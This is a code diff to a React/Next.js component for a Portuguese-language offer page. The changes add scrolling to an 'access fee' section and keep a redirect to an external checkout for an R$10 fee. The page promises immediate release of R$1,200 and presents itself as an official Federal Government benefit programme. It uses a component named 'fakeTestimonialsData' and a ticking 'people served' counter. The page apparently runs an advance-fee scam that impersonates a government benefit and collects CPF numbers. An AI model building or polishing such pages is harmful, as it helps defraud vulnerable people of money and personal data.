@@ -2,7 +2,7 @@
 "use client";
 
 import type React from 'react';
-import { useState, useEffect, FC } from 'react';
+import { useState, useEffect, FC, useRef } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
 import { CheckCircle, TrendingUp, ShieldCheck, Users } from 'lucide-react'; 
@@ -74,6 +74,7 @@ const benefitsFromUserCode = [
 const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
   const [peopleServed, setPeopleServed] = useState(2402);
   const [testimonials, setTestimonials] = useState<Testimonial[]>(fakeTestimonialsData);
+  const taxSectionRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -90,16 +91,28 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     };
   }, []);
 
+  const scrollToTaxSection = () => {
+    taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
+  };
+
+  const handleEligibilityCheckClick = () => {
+    scrollToTaxSection();
+  };
+
   const handleLiberarAcessoClick = () => {
-    console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
-    alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
-    window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
+    scrollToTaxSection(); // Scroll first
+    // Timeout to allow scroll to be visible before alert
+    setTimeout(() => {
+      console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
+      alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
+      window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
+    }, 100); // 100ms delay might be enough for the scroll to start/be noticeable
   };
 
   const formattedCpf = cpf || '***.***.***-**';
 
   return (
-    <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">
+    <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground font-[Arial,sans-serif]">
         
         <div className="text-center">
            <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 text-foreground">
@@ -126,7 +139,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         </div>
 
         {/* Nova Seção de Chamada para Ação (CTA) */}
-        <div className="text-center py-[50px] px-[20px] bg-[#0056b3] font-[Arial,sans-serif] rounded-lg">
+        <div className="text-center py-[50px] px-[20px] bg-[#0056b3] rounded-lg">
           <h2 className="text-[2.2em] text-white mb-[20px] font-bold">
             Pronto para dar o Próximo Passo?
           </h2>
@@ -134,7 +147,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             Descubra se você se qualifica para os benefícios do Programa Jovem Cidadão Ativo e inicie sua jornada. Todo o processo é seguro, transparente e realizado via plataforma oficial do Governo Federal.
           </p>
           <button
-            onClick={handleLiberarAcessoClick}
+            onClick={handleEligibilityCheckClick}
             className="bg-[#ffc107] text-[#003366] py-[18px] px-[40px] text-[1.6em] font-bold border-none rounded-[10px] cursor-pointer transition-colors duration-300 ease-linear hover:bg-[#e0a800] no-underline"
           >
             Verificar Minha Elegibilidade Agora
@@ -145,7 +158,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         </div>
           
         {/* Seção de Preço - Mantida */}
-        <div className="text-center p-4 md:p-6 bg-primary/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50 space-y-2">
+        <div ref={taxSectionRef} className="text-center p-4 md:p-6 bg-primary/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50 space-y-2">
           <h3 className="font-headline text-xl md:text-2xl font-bold text-primary mb-1 uppercase flex items-center justify-center">
              <CheckCircle className="inline-block h-7 w-7 mr-1 text-accent" /> ÚNICA TAXA DE ACESSO!
           </h3>
@@ -222,6 +235,7 @@ export default OfferStep;
     
 
     
+
 
 
 
